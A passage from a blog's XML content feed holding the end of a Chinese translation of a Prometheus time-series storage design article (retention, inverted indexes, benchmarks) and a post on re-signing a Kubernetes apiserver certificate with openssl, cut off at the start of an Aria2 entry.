┌───────────┐</span><br><span class="line"> │ 1              compacted                │  │ 4         │  │ 5 mutable │    after (option A)</span><br><span class="line"> └─────────────────────────────────────────┘  └───────────┘  └───────────┘</span><br><span class="line"> ┌──────────────────────────┐  ┌──────────────────────────┐  ┌───────────┐</span><br><span class="line"> │ 1       compacted        │  │ 3      compacted         │  │ 5 mutable │    after (option B)</span><br><span class="line"> └──────────────────────────┘  └──────────────────────────┘  └───────────┘</span><br></pre></td></tr></table></figure><p>在这个例子里，我们有一组顺序的块 <code>[1, 2, 3, 4]</code>。数据块 1, 2 和 3 可以被一起压缩，然后形成的新结构便是 <code>[1, 4]</code>。或者，将它们成对地压缩成 <code>[1，3]</code>。 所有的时间序列数据仍然存在，但是现在总体的数据块更少。 这显著降低了查询时的合并成本，因为现在需要被合并的部分查询结果会更少。</p><h4 id="保留-Retention"><a href="#保留-Retention" class="headerlink" title="保留 (Retention)"></a>保留 (Retention)</h4><p>我们看到，删除旧数据在 V2 存储引擎里是一个缓慢的过程，而且会消耗 CPU，内存和磁盘。那么，我们该如何在基于块的设计中删除旧数据呢？简单来讲，只需删除该目录下在我们配置的保留窗口里没有数据的块。 在下面的示例中，块1可以安全地被删除，而2必须保留到完全落在边界之后才行。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">                     |</span><br><span class="line">┌────────────┐  ┌────┼─────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐</span><br><span class="line">│ 1          │  │ 2  |     │  │ 3         │  │ 4         │  │ 5         │   . . .</span><br><span class="line">└────────────┘  └────┼─────┘  └───────────┘  └───────────┘  └───────────┘</span><br><span class="line">                     |</span><br><span class="line">                     |</span><br><span class="line">            retention boundary</span><br></pre></td></tr></table></figure><p>获取越旧的数据，数据块可能就变得越大，这是因为我们会不断地压缩以前压缩的块。 因此必须得有一个压缩的上限，这样一来块就不会扩展到跨越整个数据库从而影响到我们设计的最初优势。</p><p>另一个方便之处在于，这样也可以限制部分在保留窗口里部分在外面的数据块的总磁盘开销，即上面示例中的块 2.当用户将最大块的大小设置为总保留窗口的 10% 时，保留块 2 的总开销也有 10% 的上限。</p><p>总而言之，保留删除的实现从非常高的成本变成了几乎零成本。</p><blockquote><p>如果看到这里，而且读者朋友本人有一些数据库的背景的话，你可能会问一件事：这是一个新玩法吗？ —— 其实不是；而且大概还可以做得更好。</p><p>在内存里批量处理数据，在预写日志（wal）里跟踪，并定期刷新到磁盘，这种模式在今天是被广泛采纳的。</p><p>无论数据特指的问题域是什么，我们所看到的好处几乎都是普遍适用的。 遵循这一方法的突出开源案例是 LevelDB，Cassandra，InfluxDB 或 HBase。而这里面的关键是要避免重复发明劣质轮子，研究经过生产验证的方法，并采取正确的姿势应用它们。</p><p>这里仍然留有余地可以添加用户自己的黑科技。</p></blockquote><h3 id="索引-index"><a href="#索引-index" class="headerlink" title="索引 (index)"></a>索引 (index)</h3><p>调研存储的改进方案的源动力便是为了解决序列分流引发的问题。基于块的布局设计减少了为查询提供服务所涉及的时间序列的总数。因此，假设我们索引查找的时间复杂度是 O（n ^ 2），我们设法减少n个相等的数量，那么现在就有一个改进的复杂度 O（n ^ 2） - uhm，等一下… 哇靠。</p><p>这时候脑海里迅速回忆起“算法101”提醒我们的事情，理论上讲，这并没有给我们带来任何改善。 如果以前做的不好，那现在也差不多。理论有时候真的挺让人沮丧的。</p><p>通过实践，我们大部分的查询明显会被更快地应答。然而，跨越全部时间范围的查询仍然很慢，即便他们只需要找到少量的系列。在所有这些工作开始之前，我最初的想法都是想要一个切实解决这个问题的方案：我们需要一个更强大的<a href="https://en.wikipedia.org/wiki/Inverted_index" target="_blank" rel="noopener">倒排索引</a>。</p><p>倒排索引基于它们内容的子集提供对数据项的快速查找。简单来讲，用户可以找出所有带有标签“app =”nginx“的序列，而无需遍历每一个序列然后再检查它是否包含该标签。</p><p>为此，每个序列被分配一个唯一的 ID，通过它可以在恒定的时间内检索，即 O（1）。在这种情况下，ID 就是我们的正向索引。</p><blockquote><p>示例：如果ID为10,29和9的序列包含标签 <code>app=&quot;nginx&quot;</code>，标签 “nginx” 的倒排索引便是一个简单的列表 <code>[10,29,9]</code>，它可以用来快速检索包含该标签的所有序列。即便还有 200 亿个序列，这也不会影响该次查找的速度。</p></blockquote><p>简而言之，如果n是我们的序列总数，m 是给定查询的结果大小，那么使用索引的查询复杂度便是 O（m）。查询操作扩展到根据其检索的数据量（m）而不是正在搜索的数据体（n）是一个很棒的特性，因为一般来说 m 明显会更小些。</p><p>为了简单起见，我们假定可以在恒定的时间内完成倒排索引列表本身的检索。</p><p>实际上，这也几乎就是V2版本所拥有的倒排索引的类型，也是为数百万序列提供高性能查询的最低要求。敏锐的观察者会注意到，在最坏的情况下，所有的系列都存在一个标签，因此，m又是O（n）。 这是预料中的事情，而且也完全合理。 如果用户要查询所有的数据，自然就需要更长的时间。 一旦涉及到更复杂的查询这里可能就有问题了。</p><h4 id="组合标签-Combining-Labels"><a href="#组合标签-Combining-Labels" class="headerlink" title="组合标签 (Combining Labels)"></a>组合标签 (Combining Labels)</h4><p>标签被关联到数百万序列是很常见的。 假设有一个拥有数百个实例的横向可扩缩的“foo”微服务，每个实例有数千个系列。 每个系列都会有“app =”foo“的标签。当然，用户一般不会去查询所有的系列，而是通过进一步的过滤标签来限制查询，例如，我想知道我的服务实例收到多少个请求，那查询语句便是 <code>__name __ =“requests_total” AND app =“foo”</code>。</p><p>为了找出满足两个标签选择器的所有系列，我们取每个标签选择器的倒排索引列表然后取交集。 所得到的集合通常比每个输入列表小一个数量级。由于每个输入列表具有最差情况的复杂度是O（n），所以在两个列表上嵌套迭代的暴力解都具有O（n ^ 2）的运行时间。 其他集合操作也是相同的成本，例如union（app =“foo”OR app =“bar”）。当用户向查询添加进一步的标签选择器时，指数会增加到O（n ^ 3），O（n ^ 4），O（n ^ 5），… O（n ^ k）。 通过更改执行顺序，可以玩很多技巧来最大限度地有效减少运行时间。越复杂，就越需要了解数据样式和标签之间的关系。这引入了更多复杂度，但是并没有减少我们算法的最坏运行时间。</p><p>以上基本便是V2存储里采取的方式，幸运的是，看似微不足道的修改足以获得显著的提升。如果我们说我们的倒排索引中ID是排序好的话会发生什么？</p><p>假设我们初始查询的列表示例如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__name__=&quot;requests_total&quot;   -&gt;   [ 9999, 1000, 1001, 2000000, 2000001, 2000002, 2000003 ]</span><br><span class="line">     app=&quot;foo&quot;              -&gt;   [ 1, 3, 10, 11, 12, 100, 311, 320, 1000, 1001, 10002 ]</span><br><span class="line"></span><br><span class="line">             intersection   =&gt;   [ 1000, 1001 ]</span><br></pre></td></tr></table></figure><p>它们的交集相当小。我们可以通过在每个列表的开始处设置一个光标，并且始终从较小的数字那端依次推进。 当两个数字相等时，我们将数字添加到我们的结果中并推进两个游标。总的来说，我们以这种之字形模式（zig-zag pattern）扫描这两个列表，这样一来我们总的成本会是O（2n）= O（n），因为我们只是在任意一个列表中向前移动。</p><p>两个以上列表的不同集合操作的过程也是类似的效果。因此，k个集合操作的数量仅仅只会将时间复杂度修改为（O（k * n））而不是我们最坏情况的查找运行时的指数级（O（n ^ k））。真是一个大进步。</p><p>我在这里描述的内容几乎就是任意一款<a href="https://en.wikipedia.org/wiki/Search_engine_indexing#Inverted_indices" target="_blank" rel="noopener">全文搜索引擎</a> 所使用的规范搜索索引的简化版本。每个序列的描述符被视为一个简短的“文档”，每个标签（名称+固定值）作为其中的“单词”。我们可以忽略通常在搜索引擎索引中遇到的大量附加数据，例如字位置和出现频率等数据。</p><p>业内似乎都在无休止的研究探索改进实际运行时的方法，他们也常常对输入数据做出一些假设。不出所料的是，许多可以压缩倒排索引的技术均是有利有弊的。而由于我们的“文档”很小，“文字”在所有序列里都是非常重复的，所以压缩变得几乎无关紧要。 例如，一个约440万系列的现实世界数据集，每个标签约有12个，拥有少于5,000个唯一的标签。在我们最开始的存储版本里，我们坚持使用基本方法而不进行压缩，只添加了一些简单的调整来跳过大范围的非相交ID。</p><p>维持排序好的ID听上去可能很简单，但是实际坚持下来却是不太容易办到的。比如，V2存储引擎将一个哈希值作为ID赋给新的序列，我们无法有效地基于此建立一个排序好的倒排索引。另一个艰巨的任务是在数据被删除或更新时修改磁盘上的索引。通常，最简单的方法是简单地重新计算和重写它们，但是得在保证数据库可查询和一致性的同时执行这一操作。V3版本的存储引擎通过在每个块中分配一个单独的不可变索引来彻底解决这一问题，只能通过压缩时的重写来进行修改。而且，只有整个保存在内存里的可变块的索引才需要被更新。</p><h2 id="基准测试-Benchmark"><a href="#基准测试-Benchmark" class="headerlink" title="基准测试 (Benchmark)"></a>基准测试 (Benchmark)</h2><p>我发起了一个最初开发版本V3存储的基准测试，它是基于从现实世界数据集中提取的大约440万个序列描述符，并生成合成的数据点到对应的序列。这种遍历测试了单独的存储模块，而且对于快速识别性能瓶颈和触发仅在高并发负载下才会遇到的死锁尤为重要。</p><p>在完成概念性的实施之后，基准测试可以在我的Macbook Pro上保持每秒2000万个数据点的写吞吐量 —— 而所有的Chrome Tab和Slack都在持续运行。所以尽管这听上去很棒，但也表明推动这一基准测试没有进一步的价值（或者在这个问题里的随机环境下运行是这样的）。毕竟，这是合成的，这就决定了第一印象不会太好。对比最初的设计目标放大到近20倍的数据量，那么是时候将它嵌入到真正的Prometheus服务器里了，我们可以在上面添加所有只会在更贴近现实的环境里才会遇到的一切实际开销和情景。</p><p>实际上，我们没有可重复的Prometheus基准测试配置，特别是没有允许不同版本的A / B测试。 亡羊补牢为时不晚，<a href="https://github.com/prometheus/prombench" target="_blank" rel="noopener">现在我们有一个了</a>！</p><p>我们的工具允许我们声明式地定义一个基准测试场景，然后将其部署到AWS上的Kubernetes集群。 虽然这不是全面的基准测试的最佳环境，但它肯定能反映出我们的用户基本上会比64内核和128GB内存的专用裸机服务器跑的更好。我们部署了两台Prometheus 1.5.2的服务器（V2存储引擎）以及两台基于2.0开发分支（V3存储引擎）部署的两台Prometheus服务器。每台Prometheus服务都是运行在一台配备有一块SSD的专用服务器上。我们将一个横向可扩展的应用程序部署到了工作节点上并让它对外暴露典型的微服务度量。此外，Kubernetes集群和节点本身也正在被监控。全部配置均由另一个Meta-Prometheus监督，它会监控每台Prometheus服务器的健康性和性能。为了模拟序列分流，微服务会定期地向上扩容和向下缩容，以去除旧的pod，并产生新的pod，从而生成新的序列。 查询负载以“典型”地选择查询来模拟，对每个Prometheus版本的一台服务器执行操作。</p><p>总体而言，缩放和查询负载以及采样频率显著超过了今天Prometheus的生产部署。 例如，我们每15分钟换掉60％的微服务实例以产生序列分流。在现代化的基础设施中这应该每天只会发生1-5次。 这样就能确保我们的V3设计能够处理未来几年的工作负载。 因此，比起一个更为温和的环境，在现在这样的情况下，Prometheus 1.5.2和2.0之间的性能差异更大。我们每秒总共从850个同一时间暴露50万个序列的目标里收集大约11万个样本。</p><p>在放任这一配置运行一段时间后，我们可以来看些数字。我们评估一下前12个小时内两个版本均达到稳定状态的几个指标。</p><blockquote><p>请注意在Prometheus图形界面上的屏幕截图中略微截断的Y轴。</p></blockquote><img src="/hexo-blog/20180110/从头编写一款时间序列数据库/heap_usage.png"><p>堆内存使用（GB）</p><p>内存使用是当今用户最为困扰的资源问题，因为它是相对无法预测的，而且可能会导致进程崩溃。显然，被查询的服务器正在消耗更多的内存，这主要得归咎于查询引擎的开销，而这一点在未来将有望得到优化。总的来说，Prometheus 2.0的内存消耗减少了3-4倍。 大约六个小时后，Prometheus 1.5版本就有一个明显的尖峰，与六个小时的保留边界一致。 由于删除操作成本很高，资源消耗也随之增加。这将在下面的各种其他图表中体现。</p><img src="/hexo-blog/20180110/从头编写一款时间序列数据库/cpu_usage.png"><p>CPU使用率，核心/秒</p><p>CPU使用率的展示也是类似的模式，但是这里面查询服务器与非查询服务器之间的增量差异更为明显。以约0.5个核心/秒的平均值摄取大约110,000个样本/秒，与查询计算所花费的时间周期相比，我们的新存储消耗成本几乎可以忽略不计。 总的来说，新存储需要的CPU资源减少了3-10倍。</p><img src="/hexo-blog/20180110/从头编写一款时间序列数据库/disk_writes.png"><p>磁盘写入MB/秒</p><p>我们磁盘的写入利用率方面展示出了最突出和意想不到的改进。 这清晰地表明了为什么Prometheus 1.5容易造成SSD的耗损。 一旦第一个块被持久化到序列文件里，我们就能看到最开始会有一个飙升的过程，一旦删除然后开始重写，就会出现第二次飙升。令人诧异的是，被查询和非查询的服务器显示出完全不同的资源消耗。</p><p>另一方面，Prometheus 2.0只是以大约每秒一兆字节的写入速度写入到wal文件。 当块被压缩到磁盘时，写入周期性地出现一个尖峰。 这总体上节省了：惊人的97-99％。</p><img src="/hexo-blog/20180110/从头编写一款时间序列数据库/disk_usage.png"><p>磁盘大小（GB）</p><p>与磁盘写入量密切相关的是磁盘空间的总占用量。 由于我们对样本，即我们数据中的大部分组成，使用几乎相同的压缩算法，因此它们也应该是大致相同的。 在一个更稳定的环境中，这样做在很大程度上是合理的，但是因为我们要处理的是高度的序列分流，我们还得考虑每个序列的开销。</p><p>可以看到，Prometheus 1.5在两个版本都抵达稳定状态之前，消耗的存储空间因为保留策略的执行而迅速飙升。而Prometheus 2.0似乎在每个序列的开销都有一个明显的降幅。我们可以很高兴地看到磁盘空间是由预写日志文件线性填充的，并随着其压缩会瞬间下降。 事实上，Prometheus 2.0服务器不完全匹配线性增长的情况也是需要进一步调查的。</p><p>一切看上去都是充满希望的。 剩下的重要部分便是查询延迟。 新的索引应该提高了我们的查找复杂度。 没有实质改变的是这些数据的处理，例如 rate（）函数或聚合。 这些是查询引擎的一部分。</p><img src="/hexo-blog/20180110/从头编写一款时间序列数据库/query_latency.png"><p>99百分位数查询延迟（以秒为单位）</p><p>数据完全符合预期。 在Prometheus 1.5中，随着存储更多的序列，查询延迟会随时间而增加。 一旦保留策略开始执行，旧的系列被删除，它才会平息。 相比之下，Prometheus 2.0从一开始就停留在合理的位置。</p><p>这个数据怎样被收集则需要用户花些心思。对服务器发出的查询请求取决于一个时间范围值和即时查询估计的最佳搭档，压缩或轻或重，以及涉及的序列或多或少等等。它不一定代表查询的真实分布。它也不能代表冷数据的查询性能，我们可以假设所有样本数据实际上总是存储在内存中的热点数据。</p><p>尽管如此，我们仍然可以非常有信心地说，新版存储引擎在序列分流方面整体查询的性能变得非常有弹性，并且在我们高压的基准场景中存储的性能提高了4倍。在一个更加静态的环境里，我们可以假定查询时间主要用于查询引擎本身，而且延迟明显可以被改进到更低值。</p><img src="/hexo-blog/20180110/从头编写一款时间序列数据库/ingestion_rate.png"><p>采样/秒</p><p>最后，快速过一下我们对不同Prometheus服务器的采样率。 我们可以看到，配备V3存储的两台服务器是相同的采样率。几个小时后，它变得不稳定，这是由于基准集群的各个节点高负载造成的失去响应而跟Prometheus实例本身无关。 （这两行2.0的数据完全匹配的事实希望能让人信服）</p><p>即便还有更多可用的CPU和内存资源，Prometheus 1.5.2服务器的采样速率也在大大降低。 序列分流的高压导致它无法收集更大量的数据。</p><p>那么，现在每秒可以抓取的绝对最大样本数是多少？</p><p>我不知道 - 而且也故意不关注这一点。</p><p>影响Prometheus数据流量的因素众多，而这里面没有哪个单个数字能够衡量捕获质量。最大采样率历来是导致基准偏倚的一个指标，它忽略了更重要的方面，如查询性能以及对序列分流的抵御能力。 一些基本测试证实了资源使用线性增长的粗略假设。而这很容易推断出存在什么可能的结果。</p><p>我们的基准测试设置模拟了一个高度动态的环境，它给Prometheus施加的压力比今天大多数现实世界的设定要更大。 结果表明，我们在最优设计目标的基础上运行，而在不是最棒的云服务器上跑着。当然，最终衡量是否成功还是得取决于用户的反馈而不是基准数字。</p><blockquote><p>注意：在撰写本文时，Prometheus 1.6正在开发中，它将允许更可靠地配置最大内存使用量，并且可能会显著降低总体的消耗，略微有利于提高CPU利用率。我并没有进行重复的测试，因为整体的结果仍然变化不大，特别是当面对高度的序列分流时更是如此。</p></blockquote><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>Prometheus开始准备应对独立样本的高基数序列及吞吐的处理。 这仍然是一项很具有挑战的任务，但是新的存储引擎似乎使得我们对于超大规模，超收敛的GIFEE基础设施的未来感到满意。恩，它似乎跑的不错。</p><p>配备新版V3存储引擎的第一个Alpha版本的 <a href="https://prometheus.io/blog/2017/04/10/promehteus-20-sneak-peak/" target="_blank" rel="noopener">Prometheus 2.0</a> 已经可用于测试。在这个早期阶段，预计会发生崩溃，死锁和其他错误。</p><p>存储引擎本身的代码可以在<a href="https://github.com/prometheus/tsdb" target="_blank" rel="noopener">单独的项目</a>中找到。对于Prometheus本身而言，这是非常不可知论的，而且它也可以广泛用于一大波正在苦苦寻觅一个有效的本地时间序列数据库存储的应用。</p><blockquote><p>这里得感谢很多人对这项工作的贡献。以下名单不分前后：</p><p>Bojoern Rabenstein和Julius Volz在V2存储引擎上的打磨工作以及他们对于V3的反馈为这新一代设计里所能看到的一切事物奠定了基础。</p><p>Wilhelm Bierbaum持续不断地意见和见解为新一代的设计做出了重大贡献。Brian Brazil源源不断的反馈也确保我们最终采用语义上合理的方案。与Peter Bourgon的精辟讨论验证了新的设计，并且造就了这篇文章。</p><p>当然也别忘了我所在的CoreOS整个团队和公司本身对这项工作的支持和赞助。感谢那些能够耐心听我一次又一次地扯着SSD，浮点数和序列化格式的每一位同学。</p></blockquote><p>原文链接：<a href="https://fabxc.org/blog/2017-04-10-writing-a-tsdb/" target="_blank" rel="noopener">writing-a-time-series-database-from-scratch</a><br>译文链接：<a href="http://dockone.io/article/2300" target="_blank" rel="noopener">从头编写一款时间序列数据库</a> （翻译：Colstuwjx）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> K8S </tag>
            
            <tag> Prometheus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kubernetes APIServer 证书的手动签发</title>
      <link href="/hexo-blog/20171206/Kubernetes-APIServer-%E8%AF%81%E4%B9%A6%E7%9A%84%E6%89%8B%E5%8A%A8%E7%AD%BE%E5%8F%91/"/>
      <url>/hexo-blog/20171206/Kubernetes-APIServer-%E8%AF%81%E4%B9%A6%E7%9A%84%E6%89%8B%E5%8A%A8%E7%AD%BE%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>有时我们需要将自定义的域名或 IP 加入到 apiserver 的证书中，以通过 kubectl 或 kubelet 等客户端的验证，这个时候就需要对 apiserver 证书中包含的 IP 和 DNS 信息做些修改。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>首先介绍几个概念：</p><ul><li>KEY: 私钥</li><li>CSR: Certificate Signing Request 证书签名请求（公钥）</li><li>CRT: Certificate 证书</li><li>x.509: 一种证书格式</li><li>PEM: X.509 证书文件具体的存储格式（有时候用 pem 代替 crt 后缀）</li></ul><a id="more"></a><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>重新生成 apiserver 证书的步骤：</p><ol><li>创建 2048bit 的 <code>ca.key</code> （<code>/etc/kubernetes/pki</code> 目录已经存在可跳过）</li></ol><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out ca.key 2048</span><br></pre></td></tr></table></figure><ol start="2"><li>基于 <code>ca.key</code> 创建 <code>ca.crt</code> （<code>/etc/kubernetes/pki</code> 已经存在可跳过）</li></ol><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -new -nodes -key ca.key -subj <span class="hljs-string">"/CN=kube-apiserver"</span> -days 10000 -out ca.crt</span><br></pre></td></tr></table></figure><ol start="3"><li>创建 2048bit 的 <code>server.key</code> （<code>/etc/kubernetes/pki</code> 已经存在可跳过）</li></ol><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out apiserver.key 2048</span><br></pre></td></tr></table></figure><ol start="4"><li>编辑创建 csr 需要的配置文件</li></ol><p>根据需要添加或修改相应字段</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">[ req ]</span></span><br><span class="line"><span class="hljs-attr">default_bits</span> = <span class="hljs-number">2048</span></span><br><span class="line"><span class="hljs-attr">prompt</span> = <span class="hljs-literal">no</span></span><br><span class="line"><span class="hljs-attr">default_md</span> = sha256</span><br><span class="line"><span class="hljs-attr">req_extensions</span> = req_ext</span><br><span class="line"><span class="hljs-attr">distinguished_name</span> = dn</span><br><span class="line"> </span><br><span class="line"><span class="hljs-section">[ dn ]</span></span><br><span class="line"><span class="hljs-attr">CN</span> = kube-apiserver</span><br><span class="line"> </span><br><span class="line"><span class="hljs-section">[ req_ext ]</span></span><br><span class="line"><span class="hljs-attr">subjectAltName</span> = @alt_names</span><br><span class="line"> </span><br><span class="line"><span class="hljs-section">[alt_names]</span></span><br><span class="line">DNS.1 = kubernetes</span><br><span class="line">DNS.2 = kubernetes.default</span><br><span class="line">DNS.3 = kubernetes.default.svc</span><br><span class="line">DNS.4 = kubernetes.default.svc.cluster.local</span><br><span class="line">DNS.5 = haoyu-k8s-1</span><br><span class="line">IP.1 = 10.96.0.1</span><br><span class="line">IP.2 = 172.21.1.13</span><br><span class="line">IP.3 = 183.2.220.210</span><br><span class="line"> </span><br><span class="line"><span class="hljs-section">[ v3_ext ]</span></span><br><span class="line"><span class="hljs-attr">keyUsage</span>=critical, digitalSignature, keyEncipherment</span><br><span class="line"><span class="hljs-attr">extendedKeyUsage</span>=serverAuth</span><br><span class="line"><span class="hljs-attr">subjectAltName</span>=@alt_names</span><br></pre></td></tr></table></figure><ol start="5"><li>创建 <code>server.csr</code></li></ol><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key apiserver.key -out apiserver.csr -config csr.conf</span><br></pre></td></tr></table></figure><ol start="6"><li>基于 <code>ca.key</code> <code>ca.crt</code> <code>server.csr</code> 创建 <code>server.crt</code></li></ol><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -req -<span class="hljs-keyword">in</span> apiserver.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out apiserver.crt -days 10000 -extensions v3_ext -extfile csr.conf</span><br></pre></td></tr></table></figure><ol start="7"><li>查看生成的 <code>server.crt</code></li></ol><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509  -noout -text -in ./apiserver.crt</span><br></pre></td></tr></table></figure><p>最好和原证书 diff 一下，以保证其他字段一致</p><p>对于多个 apiserver 高可用的场景，方便起见可以将生成的 <code>apiserver.crt</code> 和 <code>apiserver.key</code> 一同拷贝到多个节点的 <code>/etc/kubernetes/pki</code> 目录下（使用同一份私钥和证书）。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><code>csr.conf</code>:</p><p>主要关注 alt_names 的 DNS 和 IP 字段：</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">[ req ]</span></span><br><span class="line"><span class="hljs-attr">default_bits</span> = <span class="hljs-number">2048</span></span><br><span class="line"><span class="hljs-attr">prompt</span> = <span class="hljs-literal">no</span></span><br><span class="line"><span class="hljs-attr">default_md</span> = sha256</span><br><span class="line"><span class="hljs-attr">req_extensions</span> = req_ext</span><br><span class="line"><span class="hljs-attr">distinguished_name</span> = dn</span><br><span class="line"> </span><br><span class="line"><span class="hljs-section">[ dn ]</span></span><br><span class="line"><span class="hljs-attr">CN</span> = kube-apiserver</span><br><span class="line"> </span><br><span class="line"><span class="hljs-section">[ req_ext ]</span></span><br><span class="line"><span class="hljs-attr">subjectAltName</span> = @alt_names</span><br><span class="line"> </span><br><span class="line"><span class="hljs-section">[alt_names]</span></span><br><span class="line">DNS.1 = kubernetes</span><br><span class="line">DNS.2 = kubernetes.default</span><br><span class="line">DNS.3 = kubernetes.default.svc</span><br><span class="line">DNS.4 = kubernetes.default.svc.cluster.local</span><br><span class="line">DNS.5 = kubernetes.kube-system.svc.cluster.local</span><br><span class="line">DNS.6 = host1</span><br><span class="line">DNS.7 = host2</span><br><span class="line">DNS.8 = host3</span><br><span class="line"> </span><br><span class="line">IP.1 = 172.16.0.1</span><br><span class="line">IP.2 = 10.200.20.11</span><br><span class="line">IP.3 = 10.200.20.12</span><br><span class="line">IP.4 = 10.200.20.13</span><br><span class="line">IP.5 = 10.200.20.200</span><br><span class="line"> </span><br><span class="line"><span class="hljs-section">[ v3_ext ]</span></span><br><span class="line"><span class="hljs-attr">keyUsage</span>=critical, digitalSignature, keyEncipherment</span><br><span class="line"><span class="hljs-attr">extendedKeyUsage</span>=serverAuth</span><br><span class="line"><span class="hljs-attr">subjectAltName</span>=@alt_names</span><br></pre></td></tr></table></figure><p><code>cert.sh</code>:</p><p>根据 <code>csr.conf</code> 自动签发 <code>apiserver.crt</code>，并拷贝至 <code>/etc/kubernetes/pki</code> 目录：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -key /etc/kubernetes/pki/apiserver.key -out apiserver.csr -config csr.conf</span><br><span class="line">openssl x509 -req -<span class="hljs-keyword">in</span> apiserver.csr -CA /etc/kubernetes/pki/ca.crt -CAkey /etc/kubernetes/pki/ca.key -CAcreateserial -out apiserver.crt -days 10000 -extensions v3_ext -extfile csr.conf</span><br><span class="line"> </span><br><span class="line">openssl x509  -noout -text -<span class="hljs-keyword">in</span> /etc/kubernetes/pki/apiserver.crt &gt; apiserver.crt.old.txt</span><br><span class="line">openssl x509  -noout -text -<span class="hljs-keyword">in</span> apiserver.crt &gt; apiserver.crt.txt</span><br><span class="line">diff apiserver.crt.txt apiserver.crt.old.txt</span><br><span class="line"> </span><br><span class="line">mv /etc/kubernetes/pki/apiserver.crt /etc/kubernetes/pki/apiserver.crt.bak.$(date +%Y%m%d%H%M%S)</span><br><span class="line">cp apiserver.crt /etc/kubernetes/pki/apiserver.crt</span><br><span class="line">chmod 400 /etc/kubernetes/pki/apiserver.crt</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://kubernetes.io/docs/concepts/cluster-administration/certificates/" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/cluster-administration/certificates/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> K8S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aria2 配置备忘</title>
      <link href="/hexo-blog/20171015/Aria2-%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98/"/>
      <url>/hexo-blog/20171015/Aria2-%E9%85%8D%E7%BD%AE%E5%A4%87%E5%BF%98/</url>
      
